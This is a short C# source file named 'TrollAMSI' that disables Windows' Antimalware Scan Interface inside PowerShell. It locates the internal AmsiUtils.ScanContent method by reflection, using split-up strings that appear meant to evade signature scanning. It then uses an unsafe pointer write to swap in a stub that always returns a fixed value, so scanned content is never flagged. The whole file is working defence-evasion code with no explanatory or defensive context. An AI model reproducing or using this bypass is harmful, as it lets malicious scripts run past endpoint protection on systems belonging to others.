using System;
using System.Management.Automation;
using System.Management.Automation.Host;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Xml.Linq;

public static class TrollAMSI
{
    public static void troll()
    {
        MethodInfo o = typeof(PSObject).Assembly.GetType("System.Management.Automation.Am" + "si" + "U" + "tils").GetMethod("Sca" + "nC" + "ontent", BindingFlags.Static | BindingFlags.NonPublic);
        MethodInfo t = typeof(TrollAMSI).GetMethod("M", BindingFlags.Static | BindingFlags.NonPublic);
       // RuntimeHelpers.PrepareMethod(o.MethodHandle);
       // RuntimeHelpers.PrepareMethod(t.MethodHandle);

        //Compile with unsafe flag
        unsafe { *(long*)((o.MethodHandle.Value + 8)) = *(long*)((t.MethodHandle.Value + 8)); }

    }
    private static int M(string c, string s) { return 1; }
}
